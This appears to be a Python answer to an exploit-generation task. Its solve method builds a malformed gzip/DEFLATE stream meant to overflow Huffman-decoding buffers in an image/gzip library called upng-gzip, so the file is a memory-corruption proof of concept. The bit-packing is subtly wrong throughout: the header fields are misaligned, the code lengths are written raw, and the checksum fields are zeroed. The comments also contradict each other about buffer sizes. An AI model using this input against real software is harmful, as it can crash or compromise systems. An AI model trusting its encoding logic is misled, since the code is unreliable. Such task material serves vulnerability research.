import os
import tempfile
import subprocess
import struct
import gzip

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal gzip-compatible stream that triggers the overflow
        # The vulnerability is in upng-gzip where temporary arrays for 
        # Huffman decoding are incorrectly sized to 15, but trees can have
        # lengths up to 288. We'll create a DEFLATE block with Huffman
        # trees that overflow these buffers.
        
        # Build a DEFLATE stream with dynamic Huffman codes
        # that has code length alphabet with more than 15 entries
        
        # GZIP header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Build DEFLATE block with dynamic Huffman codes
        # We need to create a block with HLIT > 15 to overflow the buffer
        
        # DEFLATE block header: BFINAL=1 (last block), BTYPE=10 (dynamic Huffman)
        block_header = 0x01 | (0x02 << 1)  # BFINAL=1, BTYPE=10
        
        # HLIT = 29 - 257 (so we have 286 literal/length codes)
        # HDIST = 0 (1 distance code)
        # HCLEN = 15 (19 code length codes)
        hlits = 29  # 257 + 29 = 286 literal codes
        hdist = 0   # 1 distance code
        hclen = 15  # 19 code length codes
        
        # Code length alphabet (19 entries)
        # We'll use values that ensure we have at least 19 non-zero entries
        code_lengths = [0] * 19
        # Set some code lengths to non-zero to create a large tree
        for i in range(19):
            code_lengths[i] = 1
        
        # Literal/length tree (286 codes, all with length 1)
        # This will overflow the 15-element buffer
        lit_tree = [1] * 286
        
        # Build the DEFLATE stream
        deflate_data = bytearray()
        
        # Write block header (3 bits)
        deflate_data.append(block_header)
        
        # Write HLIT (5 bits), HDIST (5 bits), HCLEN (4 bits)
        bits = (hlits << 9) | (hdist << 4) | hclen
        deflate_data.append(bits & 0xFF)
        deflate_data.append((bits >> 8) & 0xFF)
        
        # Write code lengths (19 entries, 3 bits each)
        # They're written in a specific order
        order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
        bits_buffer = 0
        bit_count = 0
        
        for idx in order:
            cl = code_lengths[idx]
            bits_buffer |= (cl << bit_count)
            bit_count += 3
            while bit_count >= 8:
                deflate_data.append(bits_buffer & 0xFF)
                bits_buffer >>= 8
                bit_count -= 8
        
        # Write literal/length tree (run-length encoded)
        # Simple encoding: just write the code lengths directly
        # This will create a large tree that overflows the buffer
        for cl in lit_tree:
            bits_buffer |= (cl << bit_count)
            bit_count += 1
            while bit_count >= 8:
                deflate_data.append(bits_buffer & 0xFF)
                bits_buffer >>= 8
                bit_count -= 8
        
        # Flush remaining bits
        if bit_count > 0:
            deflate_data.append(bits_buffer & 0xFF)
        
        # Add end-of-block marker (256)
        # With our tree, code 256 would be encoded as 0
        deflate_data.append(0x00)
        
        # Build complete gzip stream
        gzip_stream = bytearray()
        gzip_stream.extend(gzip_header)
        gzip_stream.extend(deflate_data)
        
        # CRC32 and ISIZE (all zeros for simplicity)
        gzip_stream.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        
        return bytes(gzip_stream)